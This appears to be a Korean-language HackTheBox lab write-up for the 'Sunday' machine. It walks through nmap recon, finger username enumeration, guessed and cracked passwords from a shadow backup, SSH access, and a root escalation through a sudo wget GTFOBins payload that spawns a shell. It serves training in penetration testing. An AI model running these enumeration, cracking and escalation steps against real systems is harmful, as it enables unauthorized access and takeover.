# Sunday - HackTheBox
## Recon
```bash
sudo nmap -p 111,22022,515,6787,79 -sC -sV -vv -oA sunday 10.129.17.207
```
<img width="1104" height="557" alt="image" src="https://github.com/user-attachments/assets/59c6933f-7403-45ad-b69e-a07474ef1cbf" />
<img width="1104" height="174" alt="image" src="https://github.com/user-attachments/assets/90c63366-d156-4e0a-9be8-a70403c41723" />

- FINGER(79)
- NFS(111)
- PRINTER(515)
- HTTP(6787)
- SSH(22022)

---
## HTTP(6787)
- 메인 페이지 접속하면 `HTTPS`를 사용해야 한다고 출력.
<img width="651" height="174" alt="image" src="https://github.com/user-attachments/assets/529afa33-da36-4f84-aa8a-a4a3e72d10de" />

<br>
<br>

- `https`를 사용하여 접속하니 `solaris` 로그인 페이지로 이동.
- 기본 계정으로 로그인 시도하였으나 실패.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/aea1c429-7c6f-4570-9158-4ec40494b7a7" />

## FINGER
- `finger-user-enum`를 사용하여 유저 수집.
```bash
./finger-user-enum.pl -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.129.17.207
```
<img width="1105" height="419" alt="image" src="https://github.com/user-attachments/assets/652ee77d-2a09-49c4-988b-3cb7ef399deb" />

<br>
<br>

- 유저목록들로 다시 `solaris`에 로그인 시도하였으나 실패.
- 머신의 이름 `sunday`를 비밀번호라 가정하고 `sunny:sunday`로 로그인 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/335a2e55-7881-49a3-9084-549ca34583ba" />

<br>
<br>

- SSH 로그인 시도하여 성공.(sunny:sunday)
```bash
ssh sunny@10.129.17.207 -p 22022
```
<img width="1105" height="141" alt="image" src="https://github.com/user-attachments/assets/9e4fded4-df31-4d26-bc2b-4c02dc352df7" />

---
## Privesc
- `history`를 살펴보니 `/backup/shadow.backup`을 열어 본 흔적 발견.
<img width="1105" height="232" alt="image" src="https://github.com/user-attachments/assets/f411f8fd-857a-4422-b0e2-c3f33b0d2ceb" />

<br>
<br>

- `sammy`의 해시 발견.
<img width="1105" height="212" alt="image" src="https://github.com/user-attachments/assets/a6cb7caa-11cf-4b60-837f-7de0be625b3c" />

<br>
<br>

- 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1105" height="217" alt="image" src="https://github.com/user-attachments/assets/bb72e115-41c9-4eee-ab49-78a57484ca41" />

<br>
<br>

- `sammy:cooldude!` 로그인.
<img width="1105" height="97" alt="image" src="https://github.com/user-attachments/assets/f7775f01-d9a1-41a7-a566-f4897277aa60" />

<br>
<br>

- `wget`을 `root`권한으로 실행 가능.
<img width="1105" height="60" alt="image" src="https://github.com/user-attachments/assets/bd38ec07-974c-43b5-8e39-699d539f4cb7" />

<br>
<br>

- https://gtfobins.org/gtfobins/wget/
- `GTFOBIN`을 참조하여 권한 상승.
```bash
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/tmp/ex.sh

chmod +x /tmp/ex.sh

sudo /usr/bin/wget --use-askpass=/tmp/ex.sh 0
```
<img width="1105" height="98" alt="image" src="https://github.com/user-attachments/assets/907bdece-25bd-4a09-bb00-d9b72f870253" />

---
## FLAG
- `/home/sammy/user.txt`
<img width="1105" height="117" alt="image" src="https://github.com/user-attachments/assets/57c34178-0aad-4e1b-acf8-a70e0f2b7e70" />

<br>
<br>

- `/root/root.txt`
<img width="1105" height="249" alt="image" src="https://github.com/user-attachments/assets/49dfba88-4b31-4657-86ae-9a2e777d96da" />
